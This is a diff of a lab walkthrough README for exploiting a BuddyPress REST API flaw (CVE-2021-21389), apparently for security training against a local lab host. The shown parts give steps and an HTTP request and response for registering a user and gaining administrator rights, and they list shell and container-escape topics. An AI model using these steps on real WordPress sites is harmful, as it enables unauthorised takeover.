@@ -2,26 +2,28 @@
 ## (time required 30 mins - 60 mins)
 ### A lab by Warren Atkinson
 
+### A wordpress website with outdate vulnrable plugin leading to authentication bypass & rce, webhost machine takeover leading to container breakout to host.
 
-BuddyPress is an open source WordPress plugin to build a community site. In releases of BuddyPress from 5.0.0 before 7.2.1 it's possible for a non-privileged, regular user to obtain administrator rights by exploiting an issue in the REST API members endpoint. The vulnerability has been fixed in BuddyPress 7.2.1. Existing installations of the plugin should be updated to this version to mitigate the issue.
+> BuddyPress is an open source WordPress plugin to build a community site. In releases of BuddyPress from 5.0.0 before 7.2.1 it's possible for a non-privileged, regular user to obtain administrator rights by exploiting an issue in the REST API members endpoint. The vulnerability has been fixed in BuddyPress 7.2.1. Existing installations of the plugin should be updated to this version to mitigate the issue.
 
 
 https://developer.buddypress.org/bp-rest-api/
 
 The buddy press api has everything you need to know about how to interact with the api.
 
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21389
-
-Subjects covered
-API manipulation
-Creating a user account with auth bypass
-Cookie manipulation leading to Privilege Escalation
-Getting a shell from wordpress
-Enumeration to find Linux elevation vector
-Docker container escape
 
 
-
+### Subjects covered
++ API manipulation
++ Creating a user account with auth bypass
++ Cookie manipulation leading to Privilege Escalation
++ Getting a shell from wordpress
++ Enumeration to find Linux elevation vector
++ Docker container escape
+ 
+  
+   
+   
 
 ### Finding the entry point.
 The WPScan CLI tool is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to test the security of their sites. The WPScan CLI tool uses our database of 38,274 WordPress vulnerabilities.
@@ -104,7 +106,7 @@ Excellent we  have created an account with the creds
 
 
 
-Please note, this account has not been activated* by email yet we have received an activation_key via the response from the previous request… Interesting.
+Please note, this account has not been **activated** by email yet we have received an **activation_key** via the response from the previous request… Interesting.
  
 
 Let's check what other endpoints are of interest?
@@ -166,9 +168,7 @@ Let's try to login… Success. But we are not admin. This far we have only teste
  
 ### Finding the nonce.
 
-Let's talk about what buddypress tries to achieve.
-
-“BuddyPress helps you build any kind of community website using WordPress, with member profiles, activity streams, user groups, messaging, and more.”
+> Let's talk about what buddypress tries to achieve. “BuddyPress helps you build any kind of community website using WordPress, with member profiles, activity streams, user groups, messaging, and more.”
 
 We are going to exploit the groups function to try and obtain the WP-Nonce
 
@@ -192,8 +192,9 @@ Cookie: wp-settings-time-6=1673475146; wordpress_test_cookie=WP%20Cookie%20check
 
 Quickly step over the rest of the steps, you will be presented with the group landing page for the group you have just created. Notice in the header “Group Administrators” interesting?
 
-Lets click manage
->> members
+Lets click manage followed by clicking members 
+
+![This is an image](https://github.com/warren2i/docker/blob/master/lab%20pics/21.png?raw=true)
 
 We are presented a page where we can complete admin like functions such as edit ban and remove users from the group.
 
@@ -247,7 +248,7 @@ Content-Type: application/json; charset=UTF-8
 {"id":11,"name":"test10","user_login":"test10","link":"http:\/\/192.168.0.16:7006\/members\/test10\/","member_types":[],"roles":["administrator"],"capabilities":["switch_themes","edit_themes","activate_plugins","edit_plugins","edit_users","edit_files","manage_options","moderate_comments","manage_categories","manage_links","upload_files","import","unfiltered_html","edit_posts","edit_others_posts","edit_published_posts","publish_posts","edit_pages","read","level_10","level_9","level_8","level_7","level_6","level_5","level_4","level_3","level_2","level_1","level_0","edit_others_pages","edit_published_pages","publish_pages","delete_pages","delete_others_pages","delete_published_pages","delete_posts","delete_others_posts","delete_published_posts","delete_private_posts","edit_private_posts","read_private_posts","delete_private_pages","edit_private_pages","read_private_pages","delete_users","create_users","unfiltered_upload","edit_dashboard","update_plugins","delete_plugins","install_plugins","update_themes","install_themes","update_core","list_users","remove_users","promote_users","edit_theme_options","delete_themes","export","SPF Manage Options","SPF Manage Forums","SPF Manage User Groups","SPF Manage Permissions","SPF Manage Components","SPF Manage Admins","SPF Manage Users","SPF Manage Profiles","SPF Manage Toolbox","SPF Manage Plugins","SPF Manage Themes","SPF Manage Integration","bp_moderate","administrator"],"extra_capabilities":["administrator"],"registered_date":"2023-01-12T06:23:33","xprofile":{"groups":{"1":{"name":"Base","fields":{"1":{"name":"Name","value":{"raw":"test10","unserialized":["test10"],"rendered":"<p>test10<\/p>\n"}}}}}},"friendship_status":false,"friendship_status_slug":"","mention_name":"test10","avatar_urls":{"full":"\/\/www.gravatar.com\/avatar\/6ec1cfdc728f001cdca2d1d1725ea263?s=150&#038;r=g&#038;d=mm","thumb":"\/\/www.gravatar.com\/avatar\/6ec1cfdc728f001cdca2d1d1725ea263?s=50&#038;r=g&#038;d=mm"},"_links":{"self":[{"href":"http:\/\/192.168.0.16:7006\/wp-json\/buddypress\/v1\/members\/11"}],"collection":[{"href":"http:\/\/192.168.0.16:7006\/wp-json\/buddypress\/v1\/members"}]}}
 ```
  
-Nice, see roles":["administrator"] let's check if we have elevated?
+Nice, see **roles":["administrator"]** let's check if we have elevated?
 
 Visit the http://192.168.0.16:7006/wp-admin/users.php to check the Role of the account we created
 
